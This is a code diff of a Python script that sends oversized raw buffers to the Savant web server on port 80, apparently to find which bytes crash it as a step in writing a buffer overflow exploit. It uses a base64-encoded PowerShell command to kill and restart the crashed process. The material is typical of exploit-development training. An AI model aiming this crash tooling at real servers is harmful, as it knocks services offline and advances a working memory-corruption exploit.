@@ -20,8 +20,6 @@ import os
 #                   --no, char is likely bad
 
 
-
-
 badchars = (
     b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
     b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -47,16 +45,13 @@ for index in range(len(badchars)):
     port = 80
     size = 260
 
-    httpMethod = b"GET /"
-    
     #make the possible bad char 90% of the input buffer to guarantee that it does/doesn't fail
+    #could also set it to 100% of the buffer
     inputBuffer = badchars[index].to_bytes(1, 'big') * int(float(size)*.9)
 
     inputBuffer += b"\x41" * (size - len(inputBuffer) )
 
-    httpEndRequest = b"\r\n\r\n"
-
-    buf = httpMethod + inputBuffer +  httpEndRequest
+    buf = inputBuffer
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((server, port))
@@ -69,7 +64,8 @@ for index in range(len(badchars)):
     except:
         #if the server crashed then the char is good
         print(hex(badchars[index]) + ' works')
-        #Get-Process savant -ErrorAction Ignore| Stop-Process -force -ErrorAction Ignore;Get-Process werfault -ErrorAction Ignore| Stop-Process -ErrorAction Ignore
+        #Stop-Process savant -force -ErrorAction Ignore; Stop-Process werfault -ErrorAction Ignore
+        #[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("xxxxxTEXTxxxxx"))
         os.system('powershell.exe -enc RwBlAHQALQBQAHIAbwBjAGUAcwBzACAAcwBhAHYAYQBuAHQAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlAHwAIABTAHQAbwBwAC0AUAByAG8AYwBlAHMAcwAgAC0AZgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABJAGcAbgBvAHIAZQA7AEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAHcAZQByAGYAYQB1AGwAdAAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAASQBnAG4AbwByAGUAfAAgAFMAdABvAHAALQBQAHIAbwBjAGUAcwBzACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABJAGcAbgBvAHIAZQA=')
         time.sleep(1)
         os.startfile('C:\\Savant\\Savant.exe')
